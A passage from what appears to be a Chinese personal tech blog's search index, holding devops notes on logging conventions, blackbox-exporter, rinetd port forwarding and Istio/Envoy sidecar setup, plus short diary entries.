{\"time\":\"2024-01-08T15:30:45.123+08:00\",\"level\":\"info\",\"source\":\"main.go:112\",\"message\":\"xxx登录成功了\",\"xx\":\"oo\"} ","date":"2024-01-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E8%A7%84%E8%8C%83/:2:2","series":null,"tags":["devops","blog"],"title":"应用日志规范","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E8%A7%84%E8%8C%83/#日志内容"},{"categories":["blog"],"content":" 配置项表格 配置项 值 日志目录 /data/logs/ 日志文件名 服务名.log 日志记录等级 info 轮转规则 1 日志格式 - 控制台 stdout logfmt 日志格式 - 文件 file json 字段 time/level/source/msg + 自定义字段 ","date":"2024-01-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E8%A7%84%E8%8C%83/:2:3","series":null,"tags":["devops","blog"],"title":"应用日志规范","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E8%A7%84%E8%8C%83/#配置项表格"},{"categories":["blog"],"content":" 日志处理日志采集/分析程序现状： 几乎都支持 /path/*.log 采集 我们采集 /data/logs/*.log 日志。 不是都支持轮转 我们程序必须自己轮转 日志轮转通常分 2 种。 copy，truncate。现拷贝一份文件，然后 truncate 清理源文件。 我本来认为这一种会更好。因为文件不动，应用不收到影响。而其他的文件随时可删。可是我们在 copy 和 truncate 的短暂间隙，可能日志还没来得及采集，会丢失数据！ rename，create。重命名现有的文件，然后创建一个新的文件。、 这个方法没有上面的缺点。但需要应用程序主动写入新的文件。需要采集程序监听这种文件的变化，避免不释放文件描述符和采集不到的情况。 现实情况是，我们的程序可以自己控制。而采集程序都支持通过 inotify 来监听这种变化，消除了第二种方式的缺点。 因此我们设计每天写入一个新 log 文件是好的实践。 ","date":"2024-01-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E8%A7%84%E8%8C%83/:3:0","series":null,"tags":["devops","blog"],"title":"应用日志规范","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E8%A7%84%E8%8C%83/#日志处理"},{"categories":["journal"],"content":"2024-01-07 日记","date":"2024-01-07","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-01-07/","series":null,"tags":["journal"],"title":"2024-01-07","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-01-07/"},{"categories":["journal"],"content":"#fun 用统计学的方式判断 youtube 有多少个视频 为什么手机最后1%的电可以用很久？-虎嗅网 电池的电压不是一成不变的。到了最后一点电的时候，电压会极速下降。 所以手机快没电的时候，会提示说 30 秒后进入应急模式。应急模式是让手机在低电压模式上运行，让你可以通话 + 扫码，而关掉了很多其他的功能。华为，小米就这么做了 因此厂商 1% 的电量策略都不一样。苹果的 1% 也不一定真的就是 1% 电量，可能是估算峰值性能多久会掉到很低的电压。于是你锁频，只打电话用不了多少电，给人 1% 能用很久的印象。 来源 科技爱好者周刊（第 284 期）：YouTube 有多少个视频？ - 阮一峰的网络日志 飞机上的 dhcp 是 256 个 ip，然后 8 小时有效期。导致经常有用户分配不到 ip。于是做了一个按钮，专门重置 dhcp 的分配信息. twitter.com/erratarob/status/1739132876732674539 ","date":"2024-01-07","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-01-07/:0:0","series":null,"tags":["journal"],"title":"2024-01-07","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-01-07/#"},{"categories":["point"],"content":"winget 是 windows 的命令行安装工具。 常用命令： 查看已安装列表 winget list 安装特定版本 winget install \"Node.js@18.16.0\" ","date":"2023-12-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/winget/:0:0","series":null,"tags":["point","wingets"],"title":"winget","uri":"/posts/%E7%AC%94%E8%AE%B0/point/winget/#"},{"categories":["blog"],"content":" 简介blackbox-exporter 是一个 prometheus 生态的产品，通过采集 http、tcp、dns 等等信息，暴露相关的指标给 prometheus。 项目开源 在这里 ","date":"2023-12-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/blackbox-exporter%E6%93%8D%E4%BD%9C%E6%89%8B%E5%86%8C/:1:0","series":null,"tags":["blog","devops"],"title":"blackbox-exporter操作手册","uri":"/posts/%E7%AC%94%E8%AE%B0/blackbox-exporter%E6%93%8D%E4%BD%9C%E6%89%8B%E5%86%8C/#简介"},{"categories":["blog"],"content":" 安装 下载 Releases · prometheus/blackbox_exporter tar xf xxx.tar.gz 解压 配置 Systemd 守护配置 /etc/systemd/system/blackbox_exporter.service [Unit] Description=blackbox_exporter After=network.target [Service] User=root Type=simple ExecStart=/blackbox_exporter/blackbox_exporter --config.file=/blackbox_exporter/blackbox.yml Restart=on-failure [Install] WantedBy=multi-user.target Alias=blackbox.service systemctl daemon-reload ; systemctl enable blackbox_exporter --now ss -ltnp | grep 9115 验证服务端口启动成功 ","date":"2023-12-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/blackbox-exporter%E6%93%8D%E4%BD%9C%E6%89%8B%E5%86%8C/:2:0","series":null,"tags":["blog","devops"],"title":"blackbox-exporter操作手册","uri":"/posts/%E7%AC%94%E8%AE%B0/blackbox-exporter%E6%93%8D%E4%BD%9C%E6%89%8B%E5%86%8C/#安装"},{"categories":["blog"],"content":" 使用","date":"2023-12-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/blackbox-exporter%E6%93%8D%E4%BD%9C%E6%89%8B%E5%86%8C/:3:0","series":null,"tags":["blog","devops"],"title":"blackbox-exporter操作手册","uri":"/posts/%E7%AC%94%E8%AE%B0/blackbox-exporter%E6%93%8D%E4%BD%9C%E6%89%8B%E5%86%8C/#使用"},{"categories":["blog"],"content":" 配置采集编辑 prometheus 配置文件，添加采集任务 scrape_configs: - job_name: 'blackbox' metrics_path: /probe params: module: [http_2xx] static_configs: - targets: - http://prometheus.io - https://prometheus.io - http://example.com:8080 relabel_configs: - source_labels: [__address__] target_label: __param_target - source_labels: [__param_target] target_label: instance - target_label: __address__ replacement: 127.0.0.1:9115 采集使用了 http_2xx 模块，模块和模块名在 blackbox_exporter 的配置文件中定义 采集了 3 个网站的信息 relabel 把站点地址存放到 target 参数中。这样 prometheus 请求 blackbox 就会带上域名信息，blackbox 才知道要采集哪个站点 把站点地址写入到 instance 这个 label 中，方便把指标进行分类 把 prometheus 实际请求的地址改成 blackbox 的服务地址 ","date":"2023-12-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/blackbox-exporter%E6%93%8D%E4%BD%9C%E6%89%8B%E5%86%8C/:3:1","series":null,"tags":["blog","devops"],"title":"blackbox-exporter操作手册","uri":"/posts/%E7%AC%94%E8%AE%B0/blackbox-exporter%E6%93%8D%E4%BD%9C%E6%89%8B%E5%86%8C/#配置采集"},{"categories":["blog"],"content":" 展示使用 grafana-ui 进行指标的展示。对比了一下，这个 简单可用。 ","date":"2023-12-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/blackbox-exporter%E6%93%8D%E4%BD%9C%E6%89%8B%E5%86%8C/:3:2","series":null,"tags":["blog","devops"],"title":"blackbox-exporter操作手册","uri":"/posts/%E7%AC%94%E8%AE%B0/blackbox-exporter%E6%93%8D%E4%BD%9C%E6%89%8B%E5%86%8C/#展示"},{"categories":["blog"],"content":" 相关文档 Blackbox Exporter (HTTP prober) | Grafana Labs 网络探测：Blackbox Exporter - prometheus-book GitHub - prometheus/blackbox_exporter: Blackbox prober exporter ","date":"2023-12-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/blackbox-exporter%E6%93%8D%E4%BD%9C%E6%89%8B%E5%86%8C/:4:0","series":null,"tags":["blog","devops"],"title":"blackbox-exporter操作手册","uri":"/posts/%E7%AC%94%E8%AE%B0/blackbox-exporter%E6%93%8D%E4%BD%9C%E6%89%8B%E5%86%8C/#相关文档"},{"categories":["blog"],"content":" 简介本来只是想记录鸡血。但是觉得很多东西觉得想要收藏，收藏以后又应该分类。 ","date":"2023-12-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%A7%86%E9%A2%91%E5%88%86%E4%BA%AB/:1:0","series":null,"tags":["blog"],"title":"视频分享","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%A7%86%E9%A2%91%E5%88%86%E4%BA%AB/#简介"},{"categories":["blog"],"content":" 鸡血人生总有很多时候需要给自己打鸡血。而我现在 2023/12/24 就需要鸡血。于是看了一些相关的内容。 这并不是我第一次看/搜索，所以决定记录下来。 关于鸡血 鸡汤是假大空. 鸡血不会. 鸡血会让你想做点什么 下面是视频 人生第二次硬核的半佛仙人-纪录片-全集-高清正版在线观看-bilibili-哔哩哔哩 “你没穷过，你不懂！”_哔哩哔哩_bilibili 你没穷过，你不懂！_哔哩哔哩_bilibili “明明应该愧疚的是我 你却……”_哔哩哔哩_bilibili 这不比毒鸡汤好使？_哔哩哔哩_bilibili “你迷茫的原因，在于读书太少，而想的太多”_哔哩哔哩_bilibili 985掉到211情绪低落，这是骂的最爽的一次_哔哩哔哩_bilibili 励志超燃演讲混剪：“学会对这个世界说去你妈的”_哔哩哔哩_bilibili https://v.douyin.com/iNC8UbAx/ Site Unreachable 【罗翔】这段话送给28岁的你，和曾经28岁的你！_哔哩哔哩_bilibili 学生想要财富自由，张老师又掏心窝子了_哔哩哔哩_bilibili ","date":"2023-12-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%A7%86%E9%A2%91%E5%88%86%E4%BA%AB/:2:0","series":null,"tags":["blog"],"title":"视频分享","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%A7%86%E9%A2%91%E5%88%86%E4%BA%AB/#鸡血"},{"categories":["journal"],"content":"2023-12-22 日记","date":"2023-12-22","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-12-22/","series":null,"tags":["journal"],"title":"2023-12-22","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-12-22/"},{"categories":["journal"],"content":"#fun 一道闪电大约 0.25 千瓦时的能量，也就是电费 1 毛多的人名币。是因为持续时间只有几微秒，高大数百万伏才会如此危险。所以收集和利用闪电也不是那么有用？ ","date":"2023-12-22","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-12-22/:0:0","series":null,"tags":["journal"],"title":"2023-12-22","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-12-22/#"},{"categories":["point"],"content":"tabby 是一个终端软件。 开源 免费 ","date":"2023-12-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/tabby/:0:0","series":null,"tags":["point","未命名"],"title":"tabby","uri":"/posts/%E7%AC%94%E8%AE%B0/point/tabby/#"},{"categories":["point"],"content":" 快捷键 ctrl+f11 聚焦所有窗口 ctrl+f12 聚焦所有标签页 点击选中 任意标签页或窗口，取消聚焦 ","date":"2023-12-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/tabby/:0:1","series":null,"tags":["point","未命名"],"title":"tabby","uri":"/posts/%E7%AC%94%E8%AE%B0/point/tabby/#快捷键"},{"categories":["journal"],"content":"2023-12-13 日记","date":"2023-12-13","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-12-13/","series":null,"tags":["journal"],"title":"2023-12-13","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-12-13/"},{"categories":["journal"],"content":"#fun 明星好物？这种视频看起来并不会觉得在带货。而是想自己去了解。 還記得我嗎？陳冠希EDC分享必備品，寵女魔人單品離不開家人，哥就是態度！｜明星的10件私物｜GQ Taiwan - YouTube ","date":"2023-12-13","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-12-13/:0:0","series":null,"tags":["journal"],"title":"2023-12-13","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-12-13/#"},{"categories":["journal"],"content":"2023-12-07 日记","date":"2023-12-07","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-12-07/","series":null,"tags":["journal"],"title":"2023-12-07","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-12-07/"},{"categories":["journal"],"content":"#fun 一个可能出错的事物与一个不可能出错的事物之间的主要区别是，当一个不可能出错的事物出错了，通常也就意味着不可修复 —— Douglas Adams 《Mostly Harmless》 ","date":"2023-12-07","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-12-07/:0:0","series":null,"tags":["journal"],"title":"2023-12-07","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-12-07/#"},{"categories":["journal"],"content":"2023-12-06 日记","date":"2023-12-06","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-12-06/","series":null,"tags":["journal"],"title":"2023-12-06","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-12-06/"},{"categories":["journal"],"content":"#fun Sindre Sorhus 是一个开发者。 在 github 上拥有最多的个人 star 很多 app 都免费 维护者许多 app，但不太看重钱 一下午的时候写代码，其他时间都是生活 来源 GitHub榜一大佬晒出可怜的存款：大家都想给他捐钱 - cnBeta.COM 移动版 应该正向思维，而不是忧虑。这样才是一个勇敢的人。 【我被美女教做人了-哔哩哔哩】 https://b23.tv/cBZKz4z ","date":"2023-12-06","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-12-06/:0:0","series":null,"tags":["journal"],"title":"2023-12-06","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-12-06/#"},{"categories":["point"],"content":" 简介Rinetd 可以帮助转发请求到 k8s 的 svc。 场景：很多时候我们用 svc 的 nodeport 或者 loadbalance，很多的组件都使用 clusterip+loadbalance 我们在云上之间自建 k8s 的时候无法使用 openelb 或者 metaelb，也就不好使用 loadbalance 改成 nodeport 又会消耗很多精力和时间 Rinetd 做的就是在一个节点上起一个进程 + 端口，把请求转发到 svc 的 clusterip 上面。方便调试，一条命令映射或关闭相关端口 ","date":"2023-12-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/rinetd/:1:0","series":null,"tags":["point","Rinetd"],"title":"Rinetd","uri":"/posts/%E7%AC%94%E8%AE%B0/point/rinetd/#简介"},{"categories":["point"],"content":" 使用先下载 Releases · samhocevar/rinetd，然后 装好依赖 开始编译 tar xf rinetd-0.73.tar.gz -C /data/server/ cd /data/server/rinetd-0.73 # 编译安装 ./bootstrap ./configure make \u0026\u0026 make install whereis rinetd # rinetd: /usr/local/sbin/rinetd /usr/local/etc/rinetd.conf rinetd -v # rinetd 0.73 vim /usr/local/etc/rinetd.conf # bindadress bindport connectaddress connectport options # 允许所有外部通过20001访问svc-clusterip的20001端口 0.0.0.0 20001 10.101.87.124 20001 # 启动 rinetd -c /usr/local/etc/rinetd.conf ","date":"2023-12-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/rinetd/:2:0","series":null,"tags":["point","Rinetd"],"title":"Rinetd","uri":"/posts/%E7%AC%94%E8%AE%B0/point/rinetd/#使用"},{"categories":["point"],"content":" 守护进程Systemd 守护进程文件 /etc/systemd/system/rinetd.service [Unit] Description=rinetd After=network.target [Service] Type=forking ExecStart=/usr/local/sbin/rinetd -c /usr/local/etc/rinetd.conf ExecReload=/bin/kill -SIGHUP $MAINPID ExecStop=/bin/kill -SIGINT $MAINPID [Install] WantedBy=multi-user.target ","date":"2023-12-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/rinetd/:3:0","series":null,"tags":["point","Rinetd"],"title":"Rinetd","uri":"/posts/%E7%AC%94%E8%AE%B0/point/rinetd/#守护进程"},{"categories":["blog"],"content":" 简介lstio 应该是现在的服务网格事实标准. ","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:1:0","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#简介"},{"categories":["blog"],"content":" 概念速览","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:2:0","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#概念速览"},{"categories":["blog"],"content":" 功能介绍Istio / 概念 流量管理：负载均衡，动态旅游，灰度发布 可观察性：调用链，访问日志，监控 策略执行：限流，ACL 安全：认证和鉴权 ","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:2:1","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#功能介绍"},{"categories":["blog"],"content":" 基础架构随着版本变化，组件能力的加强，降低复杂性，基础架构慢慢简化。 数据层面：envoy 控制层面：Istiod Pilot：转换规则，下发规则到 proxy。主要是服务发现的规则，以及流量的管理。提供了 a/b 测试，金丝雀发布。弹性（超时，重试，熔断） Mixer：接管流量。每次 proxy 之间的请求，都会上传和报告。所以可以控制访问，以及收集遥测数据。主要是因为 envoy 功能的增强，很多功能整合到了 envoy，所以 mixer 功能变少。 Citadel：服务间的安全认证。例如双向 tls 的安全 Galley：Istio 配置的管理组件，解耦 istio 与 k8s ，避免强绑定。验证、处理和分发配置信息到各个 Istio 组件。 ","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:2:2","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#基础架构"},{"categories":["blog"],"content":" istio 资源对象/图相关资源对象： Gateway 接受外部流量，相当于 ingress-svc VirtualService 定义了流量的路由规则和目标服务。是后端应用的集合，相当于 service。但是这个 service 对接的是每个 pod 里的 sidecar，而不是容器 cluster, endpoint, filter 等内容属于 envoy 内部 其他资源： ServiceEntry：应用依赖集群外部服务 Engress： 正常返回之类的流量 EnvoyFilter：控制 envoy 中的 filter 规则 DestinationRule: 一些规则，流量经过了 filter 后如何到达容器（负载均衡，连接池的大小，请求失败或者错误以后的重试和故障转移，tls 设置等） ","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:2:3","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#istio-资源对象图"},{"categories":["blog"],"content":" istioctl","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:3:0","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#istioctl"},{"categories":["blog"],"content":" 安装 下载 Releases · istio/istio tar xf istio-1.20.0-linux-amd64.tar.gz vim ~/.bashrc 添加 bin 目录到 PATH 变量 export PATH=/root/istio-1.20.0/bin:$PATH ","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:3:1","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#安装"},{"categories":["blog"],"content":" istioctl 概念和命令istioctl 由核心 core 与插件 addons 组成。不同的应用场景，就是不同插件的组合。 常见组件： istio core CRD 之类的 istiod 控制平面 ingress/egress gateway 出入网关 初始命令： istioctl profile list 查看所有组合。每个组合对应 manifests/profiles 下面的一个 yml 文件。 demo 比较完整。有采集指标，适合演示 default 默认适合生产环境 minimal 仅部署控制平面 preview 更高级别 demo，新功能尝鲜 istioctl profile diff demo empty 查看 2 个配置的区别 istioctl manifest generate --set profile=demo 生成 yml 文件 istioctl install --set profile=demo 选择配置 --set xxx.xxx.xxx=true 修改某个 profile 的值 -f xxx.yml 自定义指定 yml 常用操作命令： 检测是否正常 istioctl analyze -n default 检测 xxx 空间是否正常注入 istioctl experimental precheck 检测更新，部署，调整后控制平面是否正常 卸载 istioctl uninstall -f demo.yml 或 istioctl uninstall --purge 端口代理 istioctl dashboard --address 0.0.0.0 kiali 代理查询 istioctl proxy-status 一些可能用上的 yaml，可以用来展示流量用: kubectl apply -f samples/addons/grafana.yaml kubectl apply -f samples/addons/prometheus.yaml kubectl apply -f samples/addons/kiali.yaml kubectl apply -f samples/addons/extras/zipkin.yaml ","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:3:2","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#istioctl-概念和命令"},{"categories":["blog"],"content":" envoy","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:4:0","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#envoy"},{"categories":["blog"],"content":" 关键组件 listener：做为流量入口，监听一个 ip:port，可以代理 tcp，http，gRPC 之类的流量 filter：处理进出 envoy 的流量。修改，转换，拦截，响应。还可以路由，权限检查。 route：根据请求信息，指定使用哪一个 cluster cluster: 是 envoy 用来描述后端的一个逻辑集合。cluster 是通过 k8s-service 创建出来的一个对象。 envoy 通过 cluster 得知如何连接到特定服务 endpoint：cluster 中的一个实例。通常是一个服务实例的 ip:port. envoy 通过服务发现来动态了解 endpoint ","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:4:1","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#关键组件"},{"categories":["blog"],"content":" envoy 流量图 xDS 的 x 指某个资源，DS 是服务发现的意思 监听器 LDS 集群 CDS 端点 EDS 路由 RDS 图中 filter 是由 EnvoyFilter 创建。其他资源信息都来自于 xDS。例如 filter 后的 Route 和 Proxy 就是来自于 RDS graph TD A[Client] -- Request --\u003e B(Envoy Listener) B --\u003e C{Envoy Filter Chain} C --\u003e |HTTP Filter| D[Envoy HTTP Route] C --\u003e |TCP Filter| E[Envoy TCP Proxy] D --\u003e F[Envoy Cluster] E --\u003e F F --\u003e G[Load Balancing] G --\u003e H{Endpoint Selection} H --\u003e I[Service Pod 1] H --\u003e J[Service Pod 2] H --\u003e K[Service Pod N] style A fill:#f9f,stroke:#333,stroke-width:2px style I fill:#ccf,stroke:#333,stroke-width:2px style J fill:#ccf,stroke:#333,stroke-width:2px style K fill:#ccf,stroke:#333,stroke-width:2px 单个 pod 内的流入流出： 上面流入的流程没有变化 但是流出的流量，可能是其他 service。所以流出的 cluster 不一定是同样的 ip:port 同服务/跨服务流量图： ","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:4:2","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#envoy-流量图"},{"categories":["blog"],"content":" sidecar 注入实践","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:5:0","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#sidecar-注入实践"},{"categories":["blog"],"content":" 初始验证 # 安装istio的demo方案 istioctl install --set profile=demo # 加上标签，开始自动注入 # 删除 istio-injection- # 覆盖 --overwrite kubectl label namespace default istio-injection=enabled --overwrite # 确认打上了标签 kubectl get namespaces default --show-labels # 创建容器 kubectl create deployment my-nginx --image=nginx:latest # 验证 # 发现多个pod和很多内容 kubectl get po kubectl describe pod my-nginx-86d74cfc8f-5wvjn ","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:5:1","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#初始验证"},{"categories":["blog"],"content":" 手动注入 envoyyaml 解读： 创建命名空间 创建 envoy 配置文件 admin.address 是管理面板地址，html 页面观测 static_resources.listeners.address 是 pod 中 envoy 监听的端口，请求这个地址都会被 envoy 接管 filter_chains 中配置了 http 代理功能，同时指定接管的流量指向 local_cluster local_cluster 的端口是 80，也就是我们 nginx 容器的默认端口 创建 pod 并挂载 envoy 配置文件。必须指定 2 个变量环境，envoy 才能正常监听 80 端口。 apiVersion: v1 kind: Namespace metadata: name: kentxxq --- apiVersion: v1 kind: ConfigMap metadata: name: envoy-sidecar-configmap namespace: kentxxq data: envoy.yaml: | admin: address: socket_address: { address: 0.0.0.0, port_value: 8001 } static_resources: listeners: name: listener address: socket_address: { address: 0.0.0.0, port_value: 8002 } filter_chains: - filters: - name: envoy.filters.network.http_connection_manager typed_config: \"@type\": type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager stat_prefix: ingress_http codec_type: AUTO # 启用http代理的路由功能 http_filters: - name: envoy.filters.http.router # 一定要设定该typed_config属性，否则提示无法找到router typed_config: \"@type\": type.googleapis.com/envoy.extensions.filters.http.router.v3.Router # 定制router配置 route_config: name: tomcat_route virtual_hosts: - name: tomcat_web domains: [\"*\"] routes: - match: { prefix: \"/\" } route: { cluster: local_cluster } clusters: - name: local_cluster type: STATIC lb_policy: ROUND_ROBIN load_assignment: cluster_name: local_cluster endpoints: - lb_endpoints: - endpoint: address: socket_address: { address: 127.0.0.1, port_value: 80 } --- apiVersion: v1 kind: Pod metadata: name: tt-sidecar namespace: kentxxq spec: containers: - image: kubernetes-register.sswang.com/mypro/envoy:v1.25.3 name: envoysidecar env: - name: \"ENVOY_UID\" value: \"0\" - name: \"ENVOY_GID\" value: \"0\" volumeMounts: - name: envoyconf mountPath: /etc/envoy/ readOnly: true - name: nginx-demo image: nginx:latest volumes: - name: envoyconf configMap: name: envoy-sidecar-configmap optional: false 验证： # 可以正常请求到nginx容器的80端口 curl cluster-ip:8002 官方注入流程文档 Istio / Installing the Sidecar ","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:5:2","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#手动注入-envoy"},{"categories":["blog"],"content":" 容器解读 容器注入和启动常见问题： sidecar 如何接入流量？初始化动作，实现容器网络和 sidecar 网络一致 访问 pod 的流量，怎么给 proxy？定制大量防火墙规则 流量接管的规则从哪来？istiod 的 pilot 分发 流程： 先部署 istiod（galley，pilot） 用户提交 yaml，被 pilot 监听到 使用 istio-init 初始化动作，配置防火墙 intio-proxy（sidecar）：拉取配置，处理流量。内部有 pilot-agent 和 envoy pilot-agent 和 istiod/polit 建立连接，拿到配置后转换成 envoy 配置。同时这个连接不会关闭，一旦出现变更 istiod/polit 可以主动推送变化 启动 envoy 课件版： 1 基本环境状况 istio构建于k8s集群之上，所有的请求都是基于k8s的apiserver组件来接收 2 接收请求 当用户发起一个请求(通过namespace自动注入sidecar或者手工kube-inject注入sidecar) 3 流程执行 Pilot 监听 kube-apiserver 的请求变化。 发现k8s创建请求，并且发现namespace包含注入标签或者手工kube-inject注入sidecar istio通过CRD对象，经由kube-apiserver对pod进行属性修改，添加大量sidecar相关的属性信息 - 扩充istio-init、istio-proxy等容器属性 pod启动时候，kubelet 调用cri-服务创建容器服务 - 首先启动istio-init初始化应用容器，设定大量的proxy代理需要的防火墙规则 - 初始化容器使命结束后，结合大量启动参数，拉起istio-proxy容器(因为他们是同一个镜像) - istio-proxy容器内部的pilot-agent 进程从 Pilot中获取流量策略配置 - pilot-agent 把获取的配置转换成Envoy识别的规则，然后通过启动参数，拉起Envoy服务 - Envoy 作为sidecar，根据转换后的规则对pod内部的所有流量进行管控 - 启动应用服务容器，受sidecar的流量策略监管。 4 数据聚合 istio-proxy对多有的流量数据、日志数据、检测数据、遥测数据进行聚合 所有的内部应用容器的检测通过istio-proxy上的15020进行检测 pilot-agent与istio的pilot等组件实时同步相关信息 注意： 关于istio-proxy和应用容器的启动顺序由配置文件内部的顺序决定 但是应用容器的服务检测，必须通过istio-proxy检测后，才会向外表示正常 容器内部信息pod 内部存在 app 和 sidecar 两个容器 ifconfig 的 ip ，网卡完全一致。（初始化容器干的） 会出现很多监听的端口： 15000，15001，15006，15021，15090 都是被 envoy 进程所管理的 15004，15020 是被 pilot-agent 进程管理的 kubectl logs -f -n istio-test pod名称 -c istio-init PROXY_UID=1337, PROXY_GID=1337, 容器内输入 id 1337 ，可以看到所有流量被 istio-proxy 用户接管 uid=1337(istio-proxy) gid=1337(istio-proxy) groups=1337(istio-proxy) ISTIO_IN_REDIRECT 15006 监听所有流量进入 ISTIO_REDIRECT 15001 监听流出地址 istio 的端口，作用说明 Istio / Application Requirements ","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:5:3","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#容器解读"},{"categories":["blog"],"content":" 容器解读 容器注入和启动常见问题： sidecar 如何接入流量？初始化动作，实现容器网络和 sidecar 网络一致 访问 pod 的流量，怎么给 proxy？定制大量防火墙规则 流量接管的规则从哪来？istiod 的 pilot 分发 流程： 先部署 istiod（galley，pilot） 用户提交 yaml，被 pilot 监听到 使用 istio-init 初始化动作，配置防火墙 intio-proxy（sidecar）：拉取配置，处理流量。内部有 pilot-agent 和 envoy pilot-agent 和 istiod/polit 建立连接，拿到配置后转换成 envoy 配置。同时这个连接不会关闭，一旦出现变更 istiod/polit 可以主动推送变化 启动 envoy 课件版： 1 基本环境状况 istio构建于k8s集群之上，所有的请求都是基于k8s的apiserver组件来接收 2 接收请求 